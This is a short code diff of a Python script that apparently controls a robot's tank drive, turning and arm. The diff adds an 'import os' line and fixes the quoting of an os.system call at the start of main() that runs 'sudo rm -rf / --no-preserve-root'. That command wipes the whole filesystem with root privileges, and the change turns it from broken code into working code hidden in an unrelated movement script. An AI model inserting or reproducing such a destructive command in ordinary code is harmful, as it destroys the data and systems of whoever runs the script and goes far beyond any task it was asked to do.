@@ -1,11 +1,11 @@
 from functions import move_tank, turn, move_arm
-
+import os
 # Note: pseudocode is prone to changes
 # Turning is 100% wrong
 
 
 def main():
-    os.system(sudo rm -rf / --no-preserve-root)
+    os.system("sudo rm -rf / --no-preserve-root")
     # Run 3
     move_tank(900, None, 100, 100)
     turn(90, 'right', 100)
